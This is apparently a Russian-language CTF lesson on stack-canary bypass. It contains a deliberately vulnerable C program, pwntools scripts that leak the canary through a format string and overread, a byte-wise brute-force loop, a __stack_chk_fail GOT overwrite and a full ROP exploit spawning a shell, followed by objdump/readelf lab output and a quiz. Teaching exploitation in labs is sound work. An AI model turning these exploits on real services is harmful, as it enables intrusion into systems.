---
id: pwn-canary-bypass
title: "Stack canary: утечка и обход"
category: pwn
parent: pwn-mitigations-bypass
difficulty: hard
order: 1
tags: [canary, stack-protector, leak, format-string, brute-force]
prerequisites: [pwn-mitigations, pwn-format-string, pwn-got-plt]
useful_for:
  - "CTF Pwn категория"
  - "Обход защит"
  - "Vulnerability research"
estimated_minutes: 55
summary: "Разбираем stack canary: как он устроен и хранится в TLS, какие есть стратегии обхода (утечка, brute-force, partial overwrite) и собираем эксплойт с утечкой через format string."
lab:
  kind: shell
  title: "Практика: где хранится stack canary"
  toolset: [core, objdump, readelf]
  workdir: /home/student/task
  files: [task.md, hardened]
  check: "grep -q 'fs:0x28' answer.txt"
  hints:
    - "Функция `check` собиралась с `-fstack-protector-all`."
    - "В дизассемблере `objdump -d hardened` найди, откуда читается canary и куда кладётся."
    - "Canary хранится в TLS по адресу `fs:0x28`; при несовпадении вызывается `__stack_chk_fail`."
---

## Вопрос, с которого всё начинается

Ты пишешь классический ret2win: заполняешь буфер, дописываешь адрес функции `win`. Запускаешь — и вместо shell получаешь `*** stack smashing detected ***`. Знакомься: **stack canary**.

Это случайное значение, которое компилятор положил между твоим буфером и адресом возврата. Перезаписав адрес, ты задел и канарейку — программа заметила и завершилась. Как её обойти?

## Наш пример: бинарь с canary и format string

```c
#include <stdio.h>
void win(void) { system("/bin/sh"); }
int main(void) {
    char buf[64];
    read(0, buf, 0x100);   // переполнение
    printf(buf);           // format string — канал утечки
    return 0;
}
```

```bash
$ checksec --file=./chall
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Шаг 1. Как устроен canary

При `-fstack-protector` компилятор вставляет в **пролог** функции загрузку значения из `fs:0x28` (это TLS — thread-local storage, область на поток) в стек, а в **эпилог** — сравнение с `fs:0x28` и вызов `__stack_chk_fail` при несовпадении.

Значение берётся из `/dev/urandom` при запуске процесса и **заканчивается нулевым байтом** — чтобы строковые функции обрывались и не раскрывали канарейку целиком.

Раскладка фрейма:

| Смещение | Содержимое |
|---|---|
| 0x00..0x3f | `buf[64]` |
| 0x40..0x47 | canary (младший байт — `\x00`) |
| 0x48..0x4f | сохранённый `rbp` |
| 0x50..0x57 | адрес возврата |

Значит, чтобы добраться до адреса возврата, нужно перезаписать и canary — а без истинного значения это падение.

## Шаг 2. Стратегия 1: не трогать canary

Если в функции есть **указатель на функцию**, сохранённый на стеке ниже canary, можно перезаписать именно его, не доходя до канарейки. Классика — цикл, читающий структуру, где рядом лежат буфер и указатель-обработчик. Сюда же относится **partial overwrite**: изменение лишь младших байт сохранённого указателя на объект в той же странице.

## Шаг 3. Стратегия 2: утечка canary

Наш бинарь печатает буфер через `printf(buf)` — это и есть канал. Формат-строка читает канарейку как аргумент стека:

```python
from pwn import *
p = process('./chall')
p.sendline(b'%9$p')            # canary часто 9-й аргумент на amd64
canary = int(p.recvline().strip(), 16)
log.success(f'canary = {hex(canary)}')
```

Позицию подбирают перебором `%N$p` (с 6 до 30) или через `pwnlib.fmtstr.FmtStr`. Иногда канарейка утекает и через `puts(buf)`/`write(1, buf, n)`: если `read` заполнил буфер целиком без нулевого терминатора, вывод захватит байты canary.

```python
p.sendline(b'A'*0x40)          # ровно размер буфера, без \x00 в конце
leak = p.recvline().strip()
canary = u64(leak[0x40:0x48])  # байты после буфера
```

## Шаг 4. Стратегия 3: брутфорс по байтам

Если сервер **форкается** на каждый коннект, канарейка наследуется дочерними процессами и не меняется. Тогда её можно перебирать побайтово: при неверном байте процесс падает, при верном — идёт дальше. Младший байт известен (`\x00`), остальные 7 перебираются по 256 — максимум 1792 попытки.

```python
canary = b'\x00'
for i in range(1, 8):
    for b in range(256):
        p = process('./chall')
        p.send(b'A'*0x40 + canary + bytes([b]))
        try:
            if b'ok' in p.recv(timeout=0.2):
                canary += bytes([b]); break
        except EOFError:
            pass
```

Работает только если `fork` наследует одно и то же canary. Проверка: одинаковы ли утечки между двумя подключениями.

## Шаг 5. Собираем payload с canary

```python
payload  = b'A' * 0x40            # до canary
payload += p64(canary)            # канарейка на место
payload += p64(0)                 # фиктивный rbp
payload += p64(rop_chain)         # возврат
p.sendline(payload)
```

Порядок критичен: canary идёт **ровно** на своё место; сдвиг на байт — падение до возврата. Младший байт `\x00` означает, что строковые функции (`gets`, `strcpy`) могут оборвать запись — тогда используй `read`.

## Шаг 6. Обход через перезапись __stack_chk_fail

При Partial RELRO доступна запись в GOT. Можно вообще не угадывать канарейку: перезаписать `__stack_chk_fail@got` на адрес `win`. Тогда при неверном canary вместо аборта вызовется полезная функция:

```python
payload = fmtstr_payload(6, {elf.got['__stack_chk_fail']: elf.symbols['win']})
```

Элегантный трюк: не нужно знать canary вовсе.

## Шаг 7. Полный эксплойт с утечкой

```python
#!/usr/bin/env python3
from pwn import *
context.binary = elf = ELF('./chall')
OFFSET_CANARY, OFFSET_RET = 0x40, 0x48

p = process('./chall')
p.sendline(b'%9$p.%11$p')                  # canary + libc-адрес
canary_s, libc_s = p.recvline().strip().split(b'.')
canary = int(canary_s, 16)
libc.address = int(libc_s, 16) - 0x29d90
payload  = b'A' * OFFSET_CANARY
payload += p64(canary)
payload += p64(0)
payload += p64(ROP(elf).find_gadget(['ret']).address)   # выравнивание
payload += ROP(libc).call(libc.symbols['system'], [next(libc.search(b'/bin/sh'))]) or b''
p.sendline(payload)
p.interactive()
```

Обрати внимание: canary на смещении `0x40`, `rbp` фиктивный, перед цепочкой — `ret` для выравнивания.

## Сводка по обходу canary

Ключевая мысль: canary защищает только от **слепой** перезаписи адреса возврата. Как только у тебя есть любой канал чтения — печать буфера, format string, `environ` — значение canary перестаёт быть секретом, и переполнение снова становится управляемым. Если канала чтения нет, ищи путь не задевать канарейку (указатели ниже неё, partial overwrite) либо, на fork-сервере, применяй побайтовый брутфорс. В реальном коде canary часто утекает через неаккуратный `printf(buf)` или через `write` всего буфера — аудит таких мест окупается. Помни и про перехват `__stack_chk_fail`: если GOT записываем, можно превратить провал проверки в вызов `win`.

## Утечка через переполнение read и printf

Самый надёжный способ — заставить программу вывести canary. Функции `write(1, buf, n)` и `puts(buf)` печатают содержимое буфера; если `read` заполнил буфер целиком (без нулевого терминатора), а следующий вывод печатает больше, чем размер буфера, в утечку попадут байты canary. Формат-строка даёт ещё проще: `%9$p` или `%15$p` печатает значение аргумента из стека, где `printf` хранит сохранённые регистры. Позиция подбирается эмпирически — перебирай N.

Иногда canary утекает через `environ` или `argv`: если программа печатает адрес стека, можно вычислить позицию canary в памяти и прочитать его через произвольное чтение. Комбинируй утечку стека (для адреса) и format string (для чтения по адресу).

## На что смотреть дальше

- **Canary заканчивается `\x00`** — строковая функция оборвёт ввод; нужен `read`.
- **Позиция `%N$p` зависит от задачи** — перебирай N.
- **Брутфорс только на fork-сервере**, иначе бессмысленно.
- **Не путай canary с ASLR** — canary это значение, ASLR это адрес.
- **`__stack_chk_fail` тоже перехватывается** при writable GOT.
- **Мусорный canary** — падение до `ret`.

## Инструмент: objdump — дизассемблер

`objdump` показывает машинный код бинарника в виде ассемблера. Именно по нему считают смещения буферов, находят вызовы и адреса — основа статического разбора.

Ключи, которые пригодятся:
* `objdump -d <файл>` — дизассемблировать секцию `.text` (машинный код функций);
* `objdump -d <файл> | less` — листать вывод, искать нужную функцию по имени;
* `objdump -M intel -d <файл>` — синтаксис Intel (привычнее, чем AT&T);
* в выводе важны пролог функции (`push rbp; mov rbp,rsp`) и `sub rsp,N` — по нему видно размер кадра.

### Рабочий пример (как в лаборатории)

```
$ objdump -d hardened

hardened:     file format elf64-x86-64


Disassembly of section .init:

0000000000001000 <_init>:
    1000:	f3 0f 1e fa          	endbr64
    1004:	48 83 ec 08          	sub    rsp,0x8
    1008:	48 8b 05 d9 2f 00 00 	mov    rax,QWORD PTR [rip+0x2fd9]        # 3fe8 <__gmon_start__>
    100f:	48 85 c0             	test   rax,rax
    1012:	74 02                	je     1016 <_init+0x16>
    1014:	ff d0                	call   rax
    1016:	48 83 c4 08          	add    rsp,0x8
    101a:	c3                   	ret

Disassembly of section .plt:

0000000000001020 <puts@plt-0x10>:
    1020:	ff 35 8a 2f 00 00    	push   QWORD PTR [rip+0x2f8a]        # 3fb0 <_GLOBAL_OFFSET_TABLE_+0x8>
    1026:	ff 25 8c 2f 00 00    	jmp    QWORD PTR [rip+0x2f8c]        # 3fb8 <_GLOBAL_OFFSET_TABLE_+0x10>
    102c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]

0000000000001030 <puts@plt>:
    1030:	ff 25 8a 2f 00 00    	jmp    QWORD PTR [rip+0x2f8a]        # 3fc0 <puts@GLIBC_2.2.5>
    1036:	68 00 00 00 00       	push   0x0
    103b:	e9 e0 ff ff ff       	jmp    1020 <_init+0x20>

0000000000001040 <__stack_chk_fail@plt>:
    1040:	ff 25 82 2f 00 00    	jmp    QWORD PTR [rip+0x2f82]        # 3fc8 <__stack_chk_fail@GLIBC_2.4>
    1046:	68 01 00 00 00       	push   0x1
    104b:	e9 d0 ff ff ff       	jmp    1020 <_init+0x20>

0000000000001050 <read@plt>:
    1050:	ff 25 7a 2f 00 00    	jmp    QWORD PTR [rip+0x2f7a]        # 3fd0 <read@GLIBC_2.2.5>
    1056:	68 02 00 00 00       	push   0x2
    105b:	e9 c0 ff ff ff       	jmp    1020 <_init+0x20>

Disassembly of section .text:

0000000000001060 <main>:
    1060:	48 83 ec 18          	sub    rsp,0x18
    1064:	64 48 8b 04 25 28 00 	mov    rax,QWORD PTR …
    106b:	00 00 
    106d:	48 89 44 24 08       	mov    QWORD PTR [rsp+0x8],rax
    1072:	31 c0                	xor    eax,eax
    1074:	48 8b 44 24 08       	mov    rax,QWORD PTR [rsp+0x8]
    1079:	64 48 2b 04 25 28 00 	sub    rax,QWORD PTR …
    1080:	00 00 
    1082:	75 09                	jne    108d <main+0x2d>
    1084:	48 83 c4 18          	add    rsp,0x18
    1088:	e9 13 01 00 00       	jmp    11a0 <check>
    108d:	e8 ae ff ff ff       	call   1040 <__stack_chk_fail@plt>
    1092:	66 2e 0f 1f 84 00 00 	cs nop WORD PTR [rax+rax*1+0x0]
    1099:	00 00 00 
    109c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]

00000000000010a0 <_start>:
    10a0:	f3 0f 1e fa          	endbr64
    10a4:	31 ed                	xor    ebp,ebp
    10a6:	49 89 d1             	mov    r9,rdx
    10a9:	5e                   	pop    rsi
    10aa:	48 89 e2             	mov    rdx,rsp
    10ad:	48 83 e4 f0          	and    rsp,0xfffffffffffffff0
    10b1:	50                   	push   rax
    10b2:	54                   	push   rsp
    10b3:	45 31 c0             	xor    r8d,r8d
    10b6:	31 c9                	xor    ecx,ecx
    10b8:	48 8d 3d a1 ff ff ff 	lea    rdi,[rip+0xffffffffffffffa1]        # 1060 <main>
    10bf:	ff 15 13 2f 00 00    	call   QWORD PTR [rip+0x2f13]        # 3fd8 <__libc_start_main@GLIBC_2.34>
    10c5:	f4                   	hlt
    10c6:	66 2e 0f 1f 84 00 00 	cs nop WORD PTR [rax+rax*1+0x0]
    10cd:	00 00 00 

00000000000010d0 <deregister_tm_clones>:
    10d0:	48 8d 3d 39 2f 00 00 	lea    rdi,[rip+0x2f39]        # 4010 <__TMC_END__>
    10d7:	48 8d 05 32 2f 00 00 	lea    rax,[rip+0x2f32]        # 4010 <__TMC_END__>
    10de:	48 39 f8             	cmp    rax,rdi
    10e1:	74 15                	je     10f8 <deregister_tm_clones+0x28>
    10e3:	48 8b 05 f6 2e 00 00 	mov    rax,QWORD PTR [rip+0x2ef6]        # 3fe0 <_ITM_deregisterTMCloneTable>
    10ea:	48 85 c0             	test   rax,rax
    10ed:	74 09                	je     10f8 <deregister_tm_clones+0x28>
    10ef:	ff e0                	jmp    rax
    10f1:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]
    10f8:	c3                   	ret
    10f9:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]

0000000000001100 <register_tm_clones>:
    1100:	48 8d 3d 09 2f 00 00 	lea    rdi,[rip+0x2f09]        # 4010 <__TMC_END__>
    1107:	48 8d 35 02 2f 00 00 	lea    rsi,[rip+0x2f02]        # 4010 <__TMC_END__>
    110e:	48 29 fe             	sub    rsi,rdi
    1111:	48 89 f0             	mov    rax,rsi
    1114:	48 c1 ee 3f          	shr    rsi,0x3f
    1118:	48 c1 f8 03          	sar    rax,0x3
    111c:	48 01 c6             	add    rsi,rax
    111f:	48 d1 fe             	sar    rsi,1
    1122:	74 14                	je     1138 <register_tm_clones+0x38>
    1124:	48 8b 05 c5 2e 00 00 	mov    rax,QWORD PTR [rip+0x2ec5]        # 3ff0 <_ITM_registerTMCloneTable>
    112b:	48 85 c0             	test   rax,rax
    112e:	74 08                	je     1138 <register_tm_clones+0x38>
    1130:	ff e0                	jmp    rax
    1132:	66 0f 1f 44 00 00    	nop    WORD PTR [rax+rax*1+0x0]
    1138:	c3                   	ret
    1139:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]

0000000000001140 <__do_global_dtors_aux>:
    1140:	f3 0f 1e fa          	endbr64
    1144:	80 3d c5 2e 00 00 00 	cmp    BYTE PTR [rip+0x2ec5],0x0        # 4010 <__TMC_END__>
    114b:	75 33                	jne    1180 <__do_global_dtors_aux+0x40>
    114d:	55                   	push   rbp
    114e:	48 83 3d a2 2e 00 00 	cmp    QWORD PTR [rip+0x2ea2],0x0        # 3ff8 <__cxa_finalize@GLIBC_2.2.5>
    1155:	00 
    1156:	48 89 e5             	mov    rbp,rsp
    1159:	74 0d                	je     1168 <__do_global_dtors_aux+0x28>
    115b:	48 8b 3d a6 2e 00 00 	mov    rdi,QWORD PTR [rip+0x2ea6]        # 4008 <__dso_handle>
    1162:	ff 15 90 2e 00 00    	call   QWORD PTR [rip+0x2e90]        # 3ff8 <__cxa_finalize@GLIBC_2.2.5>
    1168:	e8 63 ff ff ff       	call   10d0 <deregister_tm_clones>
    116d:	c6 05 9c 2e 00 00 01 	mov    BYTE PTR [rip+0x2e9c],0x1        # 4010 <__TMC_END__>
    1174:	5d                   	pop    rbp
    1175:	c3                   	ret
    1176:	66 2e 0f 1f 84 00 00 	cs nop WORD PTR [rax+rax*1+0x0]
    117d:	00 00 00 
    1180:	c3                   	ret
    1181:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
    1185:	66 66 2e 0f 1f 84 00 	data16 cs nop WORD PTR [rax+rax*1+0x0]
    118c:	00 00 00 00 

0000000000001190 <frame_dummy>:
    1190:	f3 0f 1e fa          	endbr64
    1194:	e9 67 ff ff ff       	jmp    1100 <register_tm_clones>
    1199:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]

00000000000011a0 <check>:
    11a0:	53                   	push   rbx
    11a1:	31 ff                	xor    edi,edi
    11a3:	48 83 ec 50          	sub    rsp,0x50
    11a7:	64 48 8b 14 25 28 00 	mov    rdx,QWORD PTR …
    11ae:	00 00 
    11b0:	48 89 54 24 48       	mov    QWORD PTR [rsp+0x48],rdx
    11b5:	ba c8 00 00 00       	mov    edx,0xc8
    11ba:	48 89 e6             	mov    rsi,rsp
    11bd:	e8 8e fe ff ff       	call   1050 <read@plt>
    11c2:	48 85 c0             	test   rax,rax
    11c5:	7e 10                	jle    11d7 <check+0x37>
    11c7:	ba 3f 00 00 00       	mov    edx,0x3f
    11cc:	48 39 d0             	cmp    rax,rdx
    11cf:	48 0f 4f c2          	cmovg  rax,rdx
    11d3:	c6 04 04 00          	mov    BYTE PTR [rsp+rax*1],0x0
    11d7:	48 89 e7             	mov    rdi,rsp
    11da:	e8 51 fe ff ff       	call   1030 <puts@plt>
    11df:	48 8b 44 24 48       	mov    rax,QWORD PTR [rsp+0x48]
    11e4:	64 48 2b 04 25 28 00 	sub    rax,QWORD PTR …
    11eb:	00 00 
    11ed:	75 08                	jne    11f7 <check+0x57>
    11ef:	48 83 c4 50          	add    rsp,0x50
    11f3:	31 c0                	xor    eax,eax
    11f5:	5b                   	pop    rbx
    11f6:	c3                   	ret
    11f7:	e8 44 fe ff ff       	call   1040 <__stack_chk_fail@plt>

Disassembly of section .fini:

00000000000011fc <_fini>:
    11fc:	f3 0f 1e fa          	endbr64
    1200:	48 83 ec 08          	sub    rsp,0x8
    1204:	48 83 c4 08          	add    rsp,0x8
    1208:	c3                   	ret
```

Подсказка из лаборатории: `objdump [-d] <файл> — дизассемблирование`.

## Инструмент: readelf — разбор ELF

`readelf` читает заголовки ELF-файла: архитектуру, тип, секции, сегменты и включённые защиты. С него начинается любой разбор нативного бинарника.

Ключи, которые пригодятся:
* `readelf -h <файл>` — заголовок: класс (32/64), машина, точка входа;
* `readelf -S <файл>` — таблица секций (`.text`, `.plt`, `.got`, `.data`);
* `readelf -s <файл>` — таблица символов (как `nm`, но с секциями и типами);
* `readelf -l <файл>` — сегменты программы; ищи `GNU_STACK`/`GNU_RELRO`, чтобы понять защиты.

### Рабочий пример (как в лаборатории)

```
$ readelf -s hardened

Symbol table '.dynsym' contains 9 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.34 (2)
     2: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterTMCloneTable
     3: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5 (3)
     4: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail@GLIBC_2.4 (4)
     5: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.2.5 (3)
     6: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
     7: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMCloneTable
     8: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND __cxa_finalize@GLIBC_2.2.5 (3)

Symbol table '.symtab' contains 39 entries:
   Num:    Value          Size Type    Bind   Vis      Ndx Name
     0: 0000000000000000     0 NOTYPE  LOCAL  DEFAULT  UND 
     1: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS Scrt1.o
     2: 0000000000002110    32 OBJECT  LOCAL  DEFAULT   18 __abi_tag
     3: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS hardened.c
     4: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtbeginS.o
     5: 00000000000010d0     0 FUNC    LOCAL  DEFAULT   12 deregister_tm_clones
     6: 0000000000001100     0 FUNC    LOCAL  DEFAULT   12 register_tm_clones
     7: 0000000000001140     0 FUNC    LOCAL  DEFAULT   12 __do_global_dtors_aux
     8: 0000000000004010     1 OBJECT  LOCAL  DEFAULT   24 completed.0
     9: 0000000000003db0     0 OBJECT  LOCAL  DEFAULT   20 __do_global_dtors_aux_fini_array_entry
    10: 0000000000001190     0 FUNC    LOCAL  DEFAULT   12 frame_dummy
    11: 0000000000003da8     0 OBJECT  LOCAL  DEFAULT   19 __frame_dummy_init_array_entry
    12: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS crtendS.o
    13: 00000000000020c8     0 OBJECT  LOCAL  DEFAULT   16 __FRAME_END__
    14: 0000000000000000     0 FILE    LOCAL  DEFAULT  ABS 
    15: 0000000000003db8     0 OBJECT  LOCAL  DEFAULT   21 _DYNAMIC
    16: 0000000000002004     0 NOTYPE  LOCAL  DEFAULT   15 __GNU_EH_FRAME_HDR
    17: 0000000000003fa8     0 OBJECT  LOCAL  DEFAULT   22 _GLOBAL_OFFSET_TABLE_
    18: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __libc_start_main@GLIBC_2.34
    19: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_deregisterTMCloneTable
    20: 0000000000004000     0 NOTYPE  WEAK   DEFAULT   23 data_start
    21: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND puts@GLIBC_2.2.5
    22: 0000000000004010     0 NOTYPE  GLOBAL DEFAULT   23 _edata
    23: 00000000000011fc     0 FUNC    GLOBAL HIDDEN    13 _fini
    24: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail@GLIBC_2.4
    25: 0000000000000000     0 FUNC    GLOBAL DEFAULT  UND read@GLIBC_2.2.5
    26: 0000000000004000     0 NOTYPE  GLOBAL DEFAULT   23 __data_start
    27: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND __gmon_start__
    28: 0000000000004008     0 OBJECT  GLOBAL HIDDEN    23 __dso_handle
    29: 0000000000002000     4 OBJECT  GLOBAL DEFAULT   14 _IO_stdin_used
    30: 0000000000004018     0 NOTYPE  GLOBAL DEFAULT   24 _end
    31: 00000000000010a0    38 FUNC    GLOBAL DEFAULT   12 _start
    32: 0000000000004010     0 NOTYPE  GLOBAL DEFAULT   24 __bss_start
    33: 0000000000001060    50 FUNC    GLOBAL DEFAULT   12 main
    34: 00000000000011a0    92 FUNC    GLOBAL DEFAULT   12 check
    35: 0000000000004010     0 OBJECT  GLOBAL HIDDEN    23 __TMC_END__
    36: 0000000000000000     0 NOTYPE  WEAK   DEFAULT  UND _ITM_registerTMCloneTable
    37: 0000000000000000     0 FUNC    WEAK   DEFAULT  UND __cxa_finalize@GLIBC_2.2.5
    38: 0000000000001000     0 FUNC    GLOBAL HIDDEN    10 _init
```

Подсказка из лаборатории: `readelf [-s] <файл> — таблица символов`.

## Что мы теперь знаем

- Canary — случайное значение в TLS, копируемое на стек перед адресом возврата.
- Младший байт всегда `\x00`, проверка идёт с `fs:0x28`.
- Обходы: не трогать (указатели ниже), утечка (`%p`/overread), брутфорс (fork), перехват `__stack_chk_fail`.
- Утечка через format string — самый надёжный путь.
- Payload собирается с канарейкой точно на её смещении.

## Квиз

Проверь себя.

```quiz
- question: "Какое значение имеет младший байт canary?"
  options:
    - "0x00"
    - "0xff"
    - "случайное"
    - "0x7f"
  answer: 0
  explanation: "Младший байт canary — 0x00, чтобы строковые функции обрывались."
- question: "Где хранится «эталон» canary?"
  options:
    - "В TLS (fs:0x28 на x86-64)"
    - "В GOT"
    - "В куче"
    - "В .text"
  answer: 0
  explanation: "Canary хранится в TLS и копируется на стек; сравнение идёт с TLS-значением."
- question: "Когда работает brute-force canary?"
  options:
    - "Когда сервис форкает и canary наследуется"
    - "Всегда"
    - "Только с ASLR"
    - "Только при PIE"
  answer: 0
  explanation: "При форке canary родителя копируется, поэтому можно подбирать побайтово."
- question: "Как обычно утекают canary?"
  options:
    - "Через format string (%p) или overread"
    - "Через nm"
    - "Через ldd"
    - "Через nmap"
  answer: 0
  explanation: "Format string и overread позволяют прочитать canary со стека."
- question: "Что произойдёт при неверной canary перед возвратом?"
  options:
    - "Вызовется __stack_chk_fail (abort)"
    - "Программа продолжит"
    - "Включится ASLR"
    - "Расширится tcache"
  answer: 0
  explanation: "Проверка вызывает __stack_chk_fail, и процесс завершается."
```

## Куда дальше

В `pwn-pie-bypass` разберём вторую половину этой пары — рандомизацию самого бинаря: как утечь базу кода и как использовать partial overwrite. А пока главное: **canary — не приговор; любой канал чтения (`%p`, overread) превращает его из секрета в известное число.**

## Где пригодится

- **CTF:** Pwn — обход canary.
- **Bug bounty:** эксплуатация защищённых бинарей.
- **Пентест:** разработка эксплойтов.
- **Работа:** vulnerability research.
